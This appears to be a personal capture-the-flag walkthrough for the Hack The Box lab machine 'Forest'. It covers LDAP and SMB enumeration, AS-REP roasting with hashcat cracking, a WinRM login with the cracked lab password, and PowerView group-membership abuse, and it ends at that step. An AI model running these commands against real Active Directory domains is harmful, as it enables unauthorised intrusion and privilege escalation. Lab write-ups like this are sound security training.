---
title: Forest
draft: false
tags:
---

![[Forest.png]]

Machine: https://app.hackthebox.com/machines/212

---
# Enumeration(No creds)
## Port Scanning
- Getting open ports as well as service and version running on this ports
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.10.161
```
```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 -sVC -n -Pn --min-rate 5000 10.10.10.161 -oN Targeted
```
>[!example]- Result
>![[Pasted image 20250311232329.png]]

Domain Name: `htb.local`
Host Name: `FOREST`
SMB guest account support

## LDAP
- Lets try to get all available information
```bash
ldapsearch -H ldap://10.10.10.161 -x -s base
```
>[!example]- Result
>![[Pasted image 20250311232909.png]]
```bash
ldapsearch -H ldap://10.10.10.161 -x -b 'DC=htb,DC=local'
```
>[!example]- Result
>![[Pasted image 20250311233056.png]]
>This message make me sense about a [forest structure](https://academy.hackthebox.com/module/74/section/700)

>[!warning] Looks like we can use [[ldapdomaindump]] because we can't enumerate all DNs as anonymous
>

- Getting just account name that are part of the group: 'domain users' 
```bash
ldapsearch -H ldap://10.10.10.161 -x -b 'DC=htb,DC=local' "(&(objectCategory=person)(objectClass=user)(primaryGroupID=513))" sAMAccountName | grep -i 'samaccountname'
```
>[!example]- Result
>![[Pasted image 20250312003958.png]]

## Enum4Linux
- In order to get more info we can use [[enum4linux]] 
```bash
enum4linux -a 10.10.10.161 -w htb.local -A
```
>[!example]- Result
>![[Pasted image 20250312013125.png]]
>![[Pasted image 20250312013202.png]]
>![[Pasted image 20250312013349.png]]


Domain Sid: `S-1-5-21-3072663084-364016917-1341370565`
New User found: `svc-alfresco`
There are 2 Domains: `htb.local | buildin.local`

## Kerberos
- Checking if any user have the flag 'UF_DONT_REQUIRE_PREAUTH' using [[impacket-GetNPUsers]], And we have a TGT
```bash
impacket-GetNPUsers htb.local/ -usersfile usersList -request -dc-ip 10.10.10.161
```
>[!example]- Result
>![[Pasted image 20250312014340.png]]

# Exploitation
## Brute force
- now we can use [[hashcat]] in order to get the plan text password behind this TGT
```bash
hashcat -m 18200 TGTsvc-alfresco /usr/share/wordlists/rockyou.txt --force
```
>[!example]- Result
>![[Pasted image 20250312014849.png]]

Credentials:`svc-alfresco:s3rvice`

# Enumeration (Using Creds)
## LDAP
- Lets dump all information using [[ldapdomaindump]]
```bash
ldapdomaindump ldap://htb.local -u "htb.local\svc-alfresco" -p s3rvice
```
>[!example]- Result
>![[Pasted image 20250312154052.png]]

We have 2 computers: `EXCH01.htb.local | FOREST.htb.local`
# Getting Access
- We can use [[evil-winrm]] to get access (because we are in the "remote management group")

```bash
evil-winrm -p 's3rvice' -u 'svc-alfresco' -i 10.10.10.161
```
>[!example]- Result
>![[Pasted image 20250312164819.png]]

# Privilege Escalation
- We cant use [[impacket-secretsdump]] because the user cant use RPC using this tools:
>[!example]- Result
>![[Pasted image 20250312231844.png]]
>![[Pasted image 20250312231846.png]]

- we can use [[bloodhaunt]] to get a better view
```bash
.\SharpHound.exe -c ALL
```
>[!example]- Result
>![[Pasted image 20250313001403.png]]
>![[Pasted image 20250313000810.png]]

>[!warning] I recommed to use SharpHound.exe last version, becasuse [[bloodhaund-python]] didn't report me the correct path

- we can abuse "GenericALL", [info](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html#genericall-rights-on-group) get into 'KEY ADMINS' group, there are 2 ways, using `net.exe` (not recommended way) or using [[PowerView]] (recommended way)
>[!warning] You may need to authenticate to the Domain Controller as a member of ACCOUNT OPERATORS@HTB.LOCAL

```bash
. .\PowerView.ps1

$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco', $SecPassword)
Add-DomainGroupMember -Identity 'KEY ADMINS' -Members 'svc-alfresco' -Credential $Cred
Get-DomainGroupMember -Identity 'KEY ADMINS'
```
>[!example]- Result
>![[Pasted image 20250313100713.png]]



